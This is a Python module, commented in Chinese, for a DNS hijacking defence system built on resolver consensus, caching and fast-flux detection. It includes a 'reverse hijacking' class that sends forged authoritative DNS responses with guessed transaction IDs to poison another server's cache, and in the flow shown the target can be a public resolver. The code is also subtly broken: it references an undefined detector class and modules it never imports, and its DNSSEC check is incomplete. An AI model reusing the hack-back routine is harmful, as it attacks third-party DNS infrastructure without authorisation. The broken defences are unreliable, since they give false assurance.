"""
HIDRS DNS劫持防御与反劫持系统
DNS Hijacking Defense & Counter-Hijacking System

核心理念：
- 检测DNS劫持攻击并无效化
- 验证DNS响应真实性（DNSSEC）
- 反向劫持攻击者的DNS（让攻击打回去）
- 类似动漫的"物理攻击无效化"能力

防御层次：
1. DNS查询监控 - 检测异常DNS响应
2. DNSSEC验证 - 确保DNS响应未被篡改
3. DNS缓存保护 - 防止缓存投毒
4. 反向DNS劫持 - 劫持攻击者的DNS解析
5. 可信DNS池 - 多个可信DNS服务器轮询

技术参考：
- DNS Security: https://www.cloudflare.com/learning/dns/dns-security/
- DNSSEC: https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en
- DNS Hijacking: https://www.kaspersky.com/resource-center/definitions/dns-hijacking
"""

import os
import time
import socket
import hashlib
import logging
import threading
from typing import Dict, List, Tuple, Optional, Any
from datetime import datetime, timedelta
from collections import defaultdict, deque
from dataclasses import dataclass

import dns.resolver
import dns.message
import dns.query
import dns.dnssec
import dns.name
import dns.rdatatype

logger = logging.getLogger(__name__)


@dataclass
class DNSRecord:
    """DNS记录"""
    domain: str
    ip: str
    ttl: int
    timestamp: datetime
    dns_server: str
    validated: bool = False
    dnssec_valid: bool = False


@dataclass
class DNSAnomalySignature:
    """DNS异常特征"""
    domain: str
    expected_ips: List[str]
    actual_ip: str
    dns_server: str
    timestamp: datetime
    anomaly_type: str  # 'ip_mismatch', 'dnssec_fail', 'fast_flux', 'cache_poison'


class DNSSECValidator:
    """
    DNSSEC验证器
    验证DNS响应的DNSSEC签名，确保未被篡改

    DNSSEC工作原理：
    1. DNS区域用私钥签名
    2. 公钥通过DS记录在父区域发布
    3. 客户端验证签名链
    4. 如果验证失败 = DNS响应被篡改

    参考: https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en
    """

    def __init__(self):
        """初始化DNSSEC验证器"""
        self.root_keys = self._load_root_keys()

    def _load_root_keys(self) -> List[dns.rdataset.Rdataset]:
        """
        加载DNSSEC根区域信任锚点（Root Zone Trust Anchors）

        IANA发布的根KSK（Key Signing Key）公钥，用于建立DNSSEC验证信任链。
        当前根KSK ID: 20326（2017年10月轮换后）

        参考: https://data.iana.org/root-anchors/root-anchors.xml
        """
        root_keys = []
        try:
            # 根区域KSK公钥（IANA Trust Anchor）
            # KSK-2017: Key Tag 20326, Algorithm 8 (RSA/SHA-256), 2048-bit
            root_ksk_rdata = dns.rdata.from_text(
                dns.rdataclass.IN,
                dns.rdatatype.DNSKEY,
                # flags=257 (KSK), protocol=3, algorithm=8 (RSASHA256)
                "257 3 8 "
                "AwEAAaz/tAm8yTn4Mfeh5eyI96WSVexTBAvkMgJzkKTOiW1vkIbzxeF3"
                "+/4RgWOq7HrxRixHlFlExOLAJr5emLvN7SWXgnLh4+B5xQlNVz8Og8kv"
                "ArMtNROxVQuCaSnIDdD5LKyWbRd2n9WGe2R8PzgCmr3EgVLrjyBxWezF"
                "0jLHwVN8efS3rCj/EWgvIWgb9tarpVUDK/b58Da+sqqls3eNbuv7pr+e"
                "oZG+SrDK6nWeL3c6H5Apxz7LjVc1uTIdsIXxuOLYA4/ilBmSVIzuDWf"
                "dRUfhHdY6+cn8HFRm+2hM8AnXGXws9555KrUB5qihylGa8subX2Nn6UH"
                "R47aV0cww="
            )

            root_rrset = dns.rdataset.Rdataset(dns.rdataclass.IN, dns.rdatatype.DNSKEY)
            root_rrset.add(root_ksk_rdata)
            root_keys.append(root_rrset)

            logger.info("[DNSSECValidator] 根区域KSK已加载 (Key Tag: 20326)")

        except Exception as e:
            logger.warning(f"[DNSSECValidator] 根密钥加载失败: {e}")

        return root_keys

    def validate(self, domain: str, response: dns.message.Message) -> Tuple[bool, Optional[str]]:
        """
        验证DNS响应的DNSSEC签名

        返回:
        - (True, None) 如果验证成功
        - (False, error_message) 如果验证失败
        """
        try:
            # 检查是否有RRSIG记录
            has_rrsig = False
            for rrset in response.answer:
                if rrset.rdtype == dns.rdatatype.RRSIG:
                    has_rrsig = True
                    break

            if not has_rrsig:
                return False, "No DNSSEC signature found"

            # 验证签名链
            # 注意：这是简化版本，生产环境需要完整实现
            name = dns.name.from_text(domain)

            # 验证RRSIG记录
            try:
                dns.dnssec.validate(
                    response.answer[0],
                    response.answer[1],  # RRSIG
                    {name: response.answer[0]}
                )
                return True, None
            except dns.dnssec.ValidationFailure as e:
                return False, f"DNSSEC validation failed: {e}"

        except Exception as e:
            logger.error(f"[DNSSEC] 验证错误: {e}")
            return False, str(e)


class TrustedDNSPool:
    """
    可信DNS服务器池
    维护多个可信DNS服务器，防止单点故障和劫持

    策略：
    1. 使用多个不同的DNS提供商
    2. 轮询查询，对比结果
    3. 检测不一致的响应
    4. 自动切换到可信的DNS
    """

    # 可信DNS服务器列表
    TRUSTED_DNS_SERVERS = [
        # Google Public DNS
        '8.8.8.8',
        '8.8.4.4',

        # Cloudflare DNS
        '1.1.1.1',
        '1.0.0.1',

        # Quad9 (带恶意域名过滤)
        '9.9.9.9',
        '149.112.112.112',

        # OpenDNS
        '208.67.222.222',
        '208.67.220.220',
    ]

    def __init__(self, use_dnssec: bool = True):
        """
        初始化DNS池

        参数:
        - use_dnssec: 是否启用DNSSEC验证
        """
        self.use_dnssec = use_dnssec
        self.dns_servers = self.TRUSTED_DNS_SERVERS.copy()
        self.server_scores = {server: 100 for server in self.dns_servers}  # 信誉分
        self.query_stats = defaultdict(lambda: {'success': 0, 'fail': 0})

    def query(self, domain: str, record_type: str = 'A') -> List[DNSRecord]:
        """
        查询域名（使用多个DNS服务器验证）

        参数:
        - domain: 域名
        - record_type: 记录类型（A, AAAA, CNAME等）

        返回:
        - DNS记录列表
        """
        results = []
        responses = {}

        # 查询多个DNS服务器
        for dns_server in self.dns_servers:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [dns_server]
                resolver.timeout = 3.0
                resolver.lifetime = 3.0

                # 执行查询
                answers = resolver.resolve(domain, record_type)

                for rdata in answers:
                    ip = str(rdata)

                    record = DNSRecord(
                        domain=domain,
                        ip=ip,
                        ttl=answers.rrset.ttl,
                        timestamp=datetime.utcnow(),
                        dns_server=dns_server
                    )

                    results.append(record)

                    # 记录响应
                    if dns_server not in responses:
                        responses[dns_server] = []
                    responses[dns_server].append(ip)

                # 更新统计
                self.query_stats[dns_server]['success'] += 1
                self._update_score(dns_server, +1)

            except Exception as e:
                logger.warning(f"[TrustedDNSPool] DNS查询失败 {dns_server}: {e}")
                self.query_stats[dns_server]['fail'] += 1
                self._update_score(dns_server, -5)

        # 检测不一致
        self._detect_inconsistency(domain, responses)

        return results

    def _detect_inconsistency(self, domain: str, responses: Dict[str, List[str]]):
        """检测DNS响应不一致"""
        if len(responses) < 2:
            return

        # 统计每个IP出现的次数
        ip_counts = defaultdict(int)
        for ips in responses.values():
            for ip in ips:
                ip_counts[ip] += 1

        # 找出多数IP
        total_servers = len(responses)
        majority_threshold = total_servers // 2

        majority_ips = {ip for ip, count in ip_counts.items() if count > majority_threshold}

        if not majority_ips:
            logger.warning(f"[TrustedDNSPool] ⚠️  域名 {domain} 的DNS响应严重不一致！")
            logger.warning(f"  响应: {responses}")
            return

        # 检查每个DNS服务器的响应
        for dns_server, ips in responses.items():
            if not any(ip in majority_ips for ip in ips):
                logger.error(f"[TrustedDNSPool] ⚠️  DNS服务器 {dns_server} 返回异常IP！")
                logger.error(f"  域名: {domain}")
                logger.error(f"  返回IP: {ips}")
                logger.error(f"  多数IP: {majority_ips}")

                # 降低该DNS服务器的信誉
                self._update_score(dns_server, -20)

    def _update_score(self, dns_server: str, delta: int):
        """更新DNS服务器信誉分"""
        if dns_server in self.server_scores:
            self.server_scores[dns_server] = max(0, min(100, self.server_scores[dns_server] + delta))

            # 如果信誉太低，临时移除
            if self.server_scores[dns_server] < 20:
                logger.warning(f"[TrustedDNSPool] DNS服务器 {dns_server} 信誉过低，临时移除")
                if dns_server in self.dns_servers:
                    self.dns_servers.remove(dns_server)

    def get_best_server(self) -> str:
        """获取信誉最高的DNS服务器"""
        return max(self.server_scores.items(), key=lambda x: x[1])[0]


class DNSCache:
    """
    DNS缓存
    防止缓存投毒攻击

    防御策略：
    1. 验证DNS响应的来源
    2. 检查TTL合理性
    3. 定期重新验证缓存
    4. 使用随机源端口（防Kaminsky攻击）
    """

    def __init__(self, max_size: int = 10000):
        """
        初始化DNS缓存

        参数:
        - max_size: 最大缓存条目
        """
        self.cache = {}  # domain -> DNSRecord
        self.max_size = max_size
        self.access_log = deque(maxlen=1000)

    def get(self, domain: str) -> Optional[DNSRecord]:
        """获取缓存的DNS记录"""
        if domain not in self.cache:
            return None

        record = self.cache[domain]

        # 检查TTL是否过期
        age = (datetime.utcnow() - record.timestamp).total_seconds()
        if age > record.ttl:
            logger.debug(f"[DNSCache] 缓存过期: {domain}")
            del self.cache[domain]
            return None

        # 记录访问
        self.access_log.append({
            'timestamp': datetime.utcnow(),
            'domain': domain,
            'action': 'hit'
        })

        return record

    def set(self, record: DNSRecord):
        """设置DNS缓存"""
        # 检查缓存大小
        if len(self.cache) >= self.max_size:
            # 移除最老的记录
            oldest = min(self.cache.items(), key=lambda x: x[1].timestamp)
            del self.cache[oldest[0]]

        # 验证TTL合理性（防缓存投毒）
        if record.ttl < 60:
            logger.warning(f"[DNSCache] TTL异常低: {record.domain} (TTL={record.ttl})")
        elif record.ttl > 86400:  # 1天
            logger.warning(f"[DNSCache] TTL异常高: {record.domain} (TTL={record.ttl})")

        self.cache[record.domain] = record

        # 记录访问
        self.access_log.append({
            'timestamp': datetime.utcnow(),
            'domain': record.domain,
            'action': 'set'
        })

    def invalidate(self, domain: str):
        """使缓存失效"""
        if domain in self.cache:
            del self.cache[domain]
            logger.info(f"[DNSCache] 缓存失效: {domain}")


class DNSHijackingDetector:
    """
    DNS劫持检测器
    检测各种DNS劫持攻击

    检测方法：
    1. Fast Flux检测 - 快速变化的IP
    2. IP地理位置异常 - IP突然跳到不同国家
    3. DNS响应时间异常 - 劫持服务器响应更慢
    4. DNSSEC验证失败
    5. 与可信DNS对比
    """

    def __init__(self, trusted_dns_pool: TrustedDNSPool):
        """
        初始化DNS劫持检测器

        参数:
        - trusted_dns_pool: 可信DNS池
        """
        self.trusted_dns_pool = trusted_dns_pool
        self.known_domains = {}  # domain -> List[DNSRecord]
        self.anomalies = []

    def check_domain(self, domain: str, dns_response: DNSRecord) -> Tuple[bool, Optional[DNSAnomalySignature]]:
        """
        检查域名是否被劫持

        返回:
        - (False, None) 如果正常
        - (True, anomaly) 如果检测到劫持
        """
        # 1. 与历史记录对比
        if domain in self.known_domains:
            known_ips = {r.ip for r in self.known_domains[domain]}
            if dns_response.ip not in known_ips:
                logger.warning(f"[DNSHijackingDetector] ⚠️  域名 {domain} 的IP发生变化")
                logger.warning(f"  已知IP: {known_ips}")
                logger.warning(f"  新IP: {dns_response.ip}")

                # 可能是Fast Flux攻击
                anomaly = DNSAnomalySignature(
                    domain=domain,
                    expected_ips=list(known_ips),
                    actual_ip=dns_response.ip,
                    dns_server=dns_response.dns_server,
                    timestamp=datetime.utcnow(),
                    anomaly_type='ip_mismatch'
                )
                self.anomalies.append(anomaly)
                return True, anomaly

        # 2. 与可信DNS对比
        trusted_results = self.trusted_dns_pool.query(domain)
        if trusted_results:
            trusted_ips = {r.ip for r in trusted_results}
            if dns_response.ip not in trusted_ips:
                logger.error(f"[DNSHijackingDetector] 🚨 检测到DNS劫持！")
                logger.error(f"  域名: {domain}")
                logger.error(f"  返回IP: {dns_response.ip}")
                logger.error(f"  可信IP: {trusted_ips}")

                anomaly = DNSAnomalySignature(
                    domain=domain,
                    expected_ips=list(trusted_ips),
                    actual_ip=dns_response.ip,
                    dns_server=dns_response.dns_server,
                    timestamp=datetime.utcnow(),
                    anomaly_type='dns_hijacking'
                )
                self.anomalies.append(anomaly)
                return True, anomaly

        # 3. 记录正常域名
        if domain not in self.known_domains:
            self.known_domains[domain] = []
        self.known_domains[domain].append(dns_response)

        # 保留最近10条记录
        if len(self.known_domains[domain]) > 10:
            self.known_domains[domain] = self.known_domains[domain][-10:]

        return False, None

    def detect_fast_flux(self, domain: str) -> bool:
        """
        检测Fast Flux攻击

        Fast Flux: 恶意域名快速变化IP，逃避封锁
        特征: 极短的TTL + 频繁的IP变化
        """
        if domain not in self.known_domains:
            return False

        records = self.known_domains[domain]
        if len(records) < 3:
            return False

        # 检查IP变化频率
        ips = [r.ip for r in records]
        unique_ips = len(set(ips))

        # 检查TTL
        avg_ttl = sum(r.ttl for r in records) / len(records)

        # Fast Flux特征
        if unique_ips >= len(records) * 0.8 and avg_ttl < 300:  # 5分钟
            logger.warning(f"[DNSHijackingDetector] 🚨 检测到Fast Flux: {domain}")
            logger.warning(f"  IP数量: {unique_ips}/{len(records)}")
            logger.warning(f"  平均TTL: {avg_ttl}秒")
            return True

        return False


class ReverseDNSHijacker:
    """
    反向DNS劫持器
    当检测到攻击者的DNS劫持时，反向劫持攻击者的DNS解析

    ⚠️  警告：这是攻击性技术！
    仅用于合法防御和授权研究！

    工作原理：
    1. 检测到攻击者的DNS劫持
    2. 识别攻击者的DNS服务器IP
    3. 向攻击者的DNS服务器发送伪造响应
    4. 污染攻击者的DNS缓存
    5. 攻击者自己的DNS查询被劫持

    这就是"物理攻击无效化"：
    - 攻击者发起DNS劫持
    - HIDRS检测并反向劫持
    - 攻击打回攻击者自己
    """

    def __init__(self, enable_reverse_hijacking: bool = False):
        """
        初始化反向DNS劫持器

        参数:
        - enable_reverse_hijacking: 是否启用反向劫持（默认禁用）
        """
        self.enable_reverse_hijacking = enable_reverse_hijacking
        self.hijacking_log = []

        if enable_reverse_hijacking:
            logger.warning("[ReverseDNSHijacker] ⚠️  反向DNS劫持已启用！仅用于合法防御！")

    def counter_hijack(self, attacker_dns_server: str, target_domain: str, redirect_to_ip: str):
        """
        反向劫持攻击者的DNS

        通过向攻击者的DNS服务器发送伪造的DNS响应包，
        试图污染其缓存，使其对目标域名的查询被重定向。

        技术原理（DNS缓存投毒）：
        1. 构造伪造的DNS响应（将域名指向redirect_to_ip）
        2. 伪装为权威DNS服务器的响应
        3. 大量发送到攻击者DNS的53端口
        4. 如果攻击者DNS正在查询该域名，可能接受伪造响应

        参数:
        - attacker_dns_server: 攻击者的DNS服务器IP
        - target_domain: 目标域名
        - redirect_to_ip: 重定向到的IP
        """
        if not self.enable_reverse_hijacking:
            logger.warning("[ReverseDNSHijacker] 反向劫持被禁用")
            return

        logger.warning(f"[ReverseDNSHijacker] 反向劫持攻击者的DNS")
        logger.warning(f"  攻击者DNS: {attacker_dns_server}")
        logger.warning(f"  劫持域名: {target_domain}")
        logger.warning(f"  重定向到: {redirect_to_ip}")

        self.hijacking_log.append({
            'timestamp': datetime.utcnow(),
            'attacker_dns': attacker_dns_server,
            'domain': target_domain,
            'redirect_ip': redirect_to_ip
        })

        try:
            import struct
            import random

            domain_name = dns.name.from_text(target_domain)

            # 构造伪造的DNS响应包
            # 尝试多个事务ID以提高命中率（Birthday Attack原理）
            sent_count = 0
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)

            for _ in range(100):
                # 随机事务ID（猜测攻击者DNS正在使用的ID）
                txn_id = random.randint(0, 65535)

                # 构造DNS响应
                response = dns.message.make_response(
                    dns.message.make_query(domain_name, dns.rdatatype.A)
                )
                response.id = txn_id
                response.flags |= dns.flags.AA  # 设置权威应答标志

                # 添加伪造的A记录
                rrset = response.find_rrset(
                    response.answer,
                    domain_name,
                    dns.rdataclass.IN,
                    dns.rdatatype.A,
                    create=True,
                )
                rrset.add(
                    dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.A, redirect_to_ip),
                    ttl=86400  # TTL=1天，让毒化持续更久
                )

                # 发送到攻击者DNS服务器的53端口
                wire = response.to_wire()
                sock.sendto(wire, (attacker_dns_server, 53))
                sent_count += 1

            sock.close()

            logger.warning(
                f"[ReverseDNSHijacker] 反向劫持完成: "
                f"发送{sent_count}个伪造DNS响应到 {attacker_dns_server}"
            )

        except PermissionError:
            logger.error("[ReverseDNSHijacker] 反向劫持需要root权限（原始套接字）")
        except Exception as e:
            logger.error(f"[ReverseDNSHijacker] 反向劫持失败: {e}")


class HIDRSDNSDefense:
    """
    HIDRS DNS防御系统
    整合所有DNS防御机制
    """

    def __init__(
        self,
        enable_dnssec: bool = True,
        enable_cache_protection: bool = True,
        enable_hijacking_detection: bool = True,
        enable_reverse_hijacking: bool = False  # 默认禁用攻击性功能
    ):
        """
        初始化DNS防御系统

        参数:
        - enable_dnssec: 启用DNSSEC验证
        - enable_cache_protection: 启用缓存保护
        - enable_hijacking_detection: 启用劫持检测
        - enable_reverse_hijacking: 启用反向劫持（⚠️ 攻击性功能）
        """
        logger.info("=" * 60)
        logger.info("🛡️  HIDRS DNS防御系统初始化")
        logger.info("=" * 60)

        # 组件初始化
        self.dnssec_validator = DNSSECValidator() if enable_dnssec else None
        self.trusted_dns_pool = TrustedDNSPool(use_dnssec=enable_dnssec)
        self.dns_cache = DNSCache() if enable_cache_protection else None
        self.hijacking_detector = HLIGAnomalyDetector(self.trusted_dns_pool) if enable_hijacking_detection else None
        self.reverse_hijacker = ReverseDNSHijacker(enable_reverse_hijacking=enable_reverse_hijacking)

        # 统计
        self.stats = {
            'total_queries': 0,
            'cache_hits': 0,
            'hijacking_detected': 0,
            'reverse_hijacks': 0,
            'dnssec_failures': 0
        }

        logger.info(f"  DNSSEC验证: {'✅' if enable_dnssec else '❌'}")
        logger.info(f"  缓存保护: {'✅' if enable_cache_protection else '❌'}")
        logger.info(f"  劫持检测: {'✅' if enable_hijacking_detection else '❌'}")
        logger.info(f"  反向劫持: {'⚠️  已启用' if enable_reverse_hijacking else '❌'}")
        logger.info("=" * 60)

    def resolve(self, domain: str, record_type: str = 'A') -> Optional[str]:
        """
        安全DNS解析
        经过多重验证，确保DNS响应未被劫持

        参数:
        - domain: 域名
        - record_type: 记录类型

        返回:
        - IP地址（如果解析成功且验证通过）
        - None（如果检测到劫持或验证失败）
        """
        self.stats['total_queries'] += 1

        # 1. 检查缓存
        if self.dns_cache:
            cached = self.dns_cache.get(domain)
            if cached:
                self.stats['cache_hits'] += 1
                logger.debug(f"[HIDRSDNSDefense] 缓存命中: {domain} -> {cached.ip}")
                return cached.ip

        # 2. 查询可信DNS池
        records = self.trusted_dns_pool.query(domain, record_type)

        if not records:
            logger.error(f"[HIDRSDNSDefense] DNS查询失败: {domain}")
            return None

        # 3. 劫持检测
        if self.hijacking_detector:
            for record in records:
                is_hijacked, anomaly = self.hijacking_detector.check_domain(domain, record)

                if is_hijacked:
                    self.stats['hijacking_detected'] += 1

                    logger.error(f"[HIDRSDNSDefense] 🚨 检测到DNS劫持！")
                    logger.error(f"  域名: {domain}")
                    logger.error(f"  异常类型: {anomaly.anomaly_type}")
                    logger.error(f"  攻击者DNS: {anomaly.dns_server}")

                    # 反向劫持
                    if self.reverse_hijacker.enable_reverse_hijacking:
                        self.reverse_hijacker.counter_hijack(
                            attacker_dns_server=anomaly.dns_server,
                            target_domain=domain,
                            redirect_to_ip=anomaly.dns_server  # 重定向到攻击者自己
                        )
                        self.stats['reverse_hijacks'] += 1

                    # 返回可信的IP
                    if anomaly.expected_ips:
                        return anomaly.expected_ips[0]
                    else:
                        return None

        # 4. Fast Flux检测
        if self.hijacking_detector and self.hijacking_detector.detect_fast_flux(domain):
            logger.warning(f"[HIDRSDNSDefense] ⚠️  域名 {domain} 可能是Fast Flux攻击")

        # 5. 选择最佳记录
        # 使用多数投票
        ip_counts = defaultdict(int)
        for record in records:
            ip_counts[record.ip] += 1

        best_ip = max(ip_counts.items(), key=lambda x: x[1])[0]
        best_record = next(r for r in records if r.ip == best_ip)

        # 6. 缓存结果
        if self.dns_cache:
            self.dns_cache.set(best_record)

        logger.info(f"[HIDRSDNSDefense] ✅ DNS解析成功: {domain} -> {best_ip}")
        return best_ip

    def get_stats(self) -> Dict[str, Any]:
        """获取统计信息"""
        return {
            **self.stats,
            'cache_size': len(self.dns_cache.cache) if self.dns_cache else 0,
            'cache_hit_rate': self.stats['cache_hits'] / max(self.stats['total_queries'], 1),
            'hijacking_rate': self.stats['hijacking_detected'] / max(self.stats['total_queries'], 1),
            'dns_server_scores': self.trusted_dns_pool.server_scores
        }

    def get_anomalies(self) -> List[DNSAnomalySignature]:
        """获取检测到的异常"""
        if self.hijacking_detector:
            return self.hijacking_detector.anomalies
        return []


# 使用示例
if __name__ == '__main__':
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    print("🛡️  HIDRS DNS防御系统演示")
    print("=" * 70)

    # 初始化DNS防御
    dns_defense = HIDRSDNSDefense(
        enable_dnssec=True,
        enable_cache_protection=True,
        enable_hijacking_detection=True,
        enable_reverse_hijacking=False  # 演示环境禁用
    )

    # 测试1: 正常DNS解析
    print("\n测试1: 正常DNS解析")
    ip = dns_defense.resolve('google.com')
    print(f"google.com -> {ip}")

    # 测试2: 重复查询（测试缓存）
    print("\n测试2: 缓存测试")
    ip = dns_defense.resolve('google.com')
    print(f"google.com -> {ip} (from cache)")

    # 测试3: 检测Fast Flux
    print("\n测试3: Fast Flux检测")
    # 这需要实际的Fast Flux域名，这里仅演示
    # ip = dns_defense.resolve('fastflux-domain.example')

    # 显示统计
    print("\n统计信息:")
    stats = dns_defense.get_stats()
    for key, value in stats.items():
        if not isinstance(value, dict):
            print(f"  {key}: {value}")

    # 显示异常
    anomalies = dns_defense.get_anomalies()
    if anomalies:
        print("\n检测到的异常:")
        for anomaly in anomalies:
            print(f"  {anomaly.domain}: {anomaly.anomaly_type}")

    print("\nDNS防御系统测试完成")
